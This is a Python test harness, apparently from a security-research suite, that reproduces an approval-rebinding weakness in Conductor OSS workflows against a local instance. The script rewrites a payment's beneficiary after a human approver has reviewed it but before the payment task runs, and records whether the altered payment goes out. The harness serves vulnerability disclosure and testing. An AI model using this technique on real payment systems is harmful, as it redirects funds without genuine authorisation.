#!/usr/bin/env python3
# APF / APF - REBIND reproduction harness: Conductor OSS (#36)
#
# REBIND shape: ONE genuine human approval of the payment as reviewed (args A = Meridian),
# but before the gated INLINE pay task executes a state writer mutates the argument to B.
# The pay task reads amount/beneficiary from the workflow VARIABLES (seeded from the input by a
# SET_VARIABLE task); the HUMAN-task approval carries only {approved, approver} and is bound to
# neither the argument values nor a nonce. A state writer updates the workflow variables A->B
# via the update-variables REST API while the HUMAN task is IN_PROGRESS; the genuine approver
# then completes the HUMAN task and the pay task fires with the MUTATED args, paying Blackwell
# under Priya. (The variables endpoint stands in for the storage-trust write; a real state
# writer edits the durable store directly.)
#
# Self-proving: verdict derived from Conductor's own workflow output on the rebind run.
#
# Usage:
#   pip install requests
#   docker compose up -d      # wait until /health is healthy (first boot 1-2 min)
#   python3 harness_rebind.py
import sys, os, time, json
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import apf_common as C

BASE = os.environ.get("CONDUCTOR_BASE", "http://localhost:8080/api")
OUT = os.path.join(os.environ.get("APF_EVIDENCE_BASE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "evidence")), "36_conductor")
WF_NAME = "apf_payment_rebind"

# pay reads amount/beneficiary from workflow VARIABLES (mutable), seeded from input by SET_VARIABLE
WORKFLOW_DEF = {
    "name": WF_NAME, "version": 1, "schemaVersion": 2, "ownerEmail": "apf@example.com",
    "inputParameters": ["amount", "beneficiary"],
    "variables": {"amount": 0, "beneficiary": ""},
    "tasks": [
        {"name": "seed_vars", "taskReferenceName": "seed_vars", "type": "SET_VARIABLE",
         "inputParameters": {"amount": "${workflow.input.amount}", "beneficiary": "${workflow.input.beneficiary}"}},
        {"name": "wait_for_approval", "taskReferenceName": "wait_for_approval",
         "type": "HUMAN", "inputParameters": {}},
        {"name": "pay", "taskReferenceName": "pay", "type": "INLINE",
         "inputParameters": {
             "evaluatorType": "graaljs",
             "approved": "${wait_for_approval.output.approved}",
             "approver": "${wait_for_approval.output.approver}",
             "amount": "${workflow.variables.amount}",
             "beneficiary": "${workflow.variables.beneficiary}",
             "expression": "(function(){ return $.approved === true ? {paid:true, amount:$.amount, beneficiary:$.beneficiary, approver:$.approver} : {paid:false}; })();"
         }},
    ],
    "outputParameters": {
        "paid": "${pay.output.result.paid}", "amount": "${pay.output.result.amount}",
        "beneficiary": "${pay.output.result.beneficiary}", "approver": "${pay.output.result.approver}"},
}


def wait_up(tries=90):
    for _ in range(tries):
        try:
            if requests.get(BASE + "/metadata/workflow", timeout=5).ok:
                return
        except requests.RequestException:
            pass
        time.sleep(2)
    raise SystemExit("Conductor API did not come up in time")


def register_workflow():
    r = requests.put(BASE + "/metadata/workflow", json=[WORKFLOW_DEF], timeout=30)
    if not r.ok:
        r = requests.post(BASE + "/metadata/workflow", json=WORKFLOW_DEF, timeout=30)
        if not r.ok:
            raise SystemExit("workflow register failed: %s %s" % (r.status_code, r.text[:300]))


def start_workflow(amount, beneficiary):
    r = requests.post(BASE + "/workflow",
                      json={"name": WF_NAME, "version": 1,
                            "input": {"amount": amount, "beneficiary": beneficiary}}, timeout=30)
    if not r.ok:
        raise SystemExit("start failed: %s %s" % (r.status_code, r.text[:300]))
    return r.text.strip().strip('"')


def get_workflow(wid):
    return requests.get(BASE + "/workflow/" + wid + "?includeTasks=true", timeout=15).json()


def wait_human_ready(wid, tries=60):
    for _ in range(tries):
        wf = get_workflow(wid)
        for t in wf.get("tasks", []):
            if t.get("taskType") == "HUMAN" and t.get("status") == "IN_PROGRESS":
                return wf
        time.sleep(1)
    raise SystemExit("HUMAN task did not reach IN_PROGRESS for %s" % wid)


def update_variables(wid, variables):
    # state-writer mutation of the durable workflow variables over REST (storage-trust write)
    r = requests.post(BASE + "/workflow/" + wid + "/variables", json=variables, timeout=20)
    return r.status_code


def complete_human(wid, approved, approver):
    r = requests.post(BASE + "/tasks/" + wid + "/wait_for_approval/COMPLETED",
                      json={"approved": approved, "approver": approver}, timeout=30)
    return r.status_code


def wait_done(wid, tries=60):
    for _ in range(tries):
        wf = get_workflow(wid)
        if wf.get("status") in ("COMPLETED", "FAILED", "TERMINATED"):
            return wf
        time.sleep(1)
    return get_workflow(wid)


def main():
    wait_up()
    register_workflow()
    audit = []

    # ---- control: genuine approval of args A (Meridian) ----
    widA = start_workflow(C.A_ARGS["amount"], C.A_ARGS["beneficiary"])
    wait_human_ready(widA)
    complete_human(widA, True, C.APPROVER)                 # genuine approver acts
    wfA = wait_done(widA)
    outA = wfA.get("output", {})
    if outA.get("paid") in (True, "true"):
        audit.append({"action": "execute_payment", "amount": outA.get("amount"),
                      "beneficiary": outA.get("beneficiary"), "approved_by_in_audit": outA.get("approver")})
    C.line("control", f"genuine approval by {C.APPROVER} -> workflow output: paid={outA.get('paid')} approver={outA.get('approver')} beneficiary={outA.get('beneficiary')}")
    C.line("audit", "HUMAN-task approval carries decision only; pay reads args from workflow variables")

    # ---- rebind: state writer mutates the approved args A->B, then the genuine approver completes ----
    widB = start_workflow(C.A_ARGS["amount"], C.A_ARGS["beneficiary"])   # Priya reviews Meridian
    wait_human_ready(widB)
    mut_status = update_variables(widB, {"amount": C.B_ARGS["amount"], "beneficiary": C.B_ARGS["beneficiary"]})  # mutate args A->B
    vars_after = get_workflow(widB).get("variables", {})       # confirm the mutation actually landed
    mutation_landed = vars_after.get("beneficiary") == C.B_ARGS["beneficiary"]
    C.line("audit", f"update_variables status={mut_status}; workflow.variables.beneficiary after={vars_after.get('beneficiary')} (landed={mutation_landed})")
    complete_human(widB, True, C.APPROVER)                 # genuine approver approves what they reviewed
    wfB = wait_done(widB)
    outB = wfB.get("output", {})
    rebind_fired = (outB.get("paid") in (True, "true")) and outB.get("beneficiary") == C.B_ARGS["beneficiary"] \
        and outB.get("approver") == C.APPROVER
    b_row = None
    if rebind_fired:
        b_row = {"action": "execute_payment", "amount": outB.get("amount"),
                 "beneficiary": outB.get("beneficiary"), "approved_by_in_audit": outB.get("approver")}
        audit.append(b_row)
    C.line("rebind", f"args mutated A->B before pay -> workflow output: paid={outB.get('paid')} approver={outB.get('approver')} beneficiary={outB.get('beneficiary')}")

    nonce = "n-rebind-0036"

    # Honest verdict: EXPOSED if B was paid; INCONCLUSIVE if the mutation vector never
    # persisted (REBIND was not actually exercised); RESISTANT only if the mutation landed
    # but pay still used A (genuine snapshot at schedule time).
    if rebind_fired:
        verdict = C.verdict_rebind(True)
    elif not mutation_landed:
        verdict = "INCONCLUSIVE"
    else:
        verdict = C.verdict_rebind(False)
    C.line("verdict", verdict)
    h = C.emit_evidence("Conductor", OUT, {
        "shape": "REBIND",
        "restore_path": "pay reads amount/beneficiary from workflow variables (mutable); HUMAN-task approval is decision-only",
        "execution_tier": "give-code (real Conductor REST + HUMAN task + update-variables; run on Docker to confirm)",
        "genuine_run": widA, "rebind_run": widB,
        "genuine_args": C.A_ARGS, "mutated_args": C.B_ARGS,
        "mutation_landed": mutation_landed, "variables_after_mutation": vars_after,
        "rebind_fired": rebind_fired, "rebound_payment": b_row,
        "workflow_output_runA": outA, "workflow_output_runB": outB,
        "audit_ledger": audit, "verdict": verdict,
    })
    print("EVIDENCE_HASH16", h)


if __name__ == "__main__":
    C.guarded_main("Conductor", OUT, main)
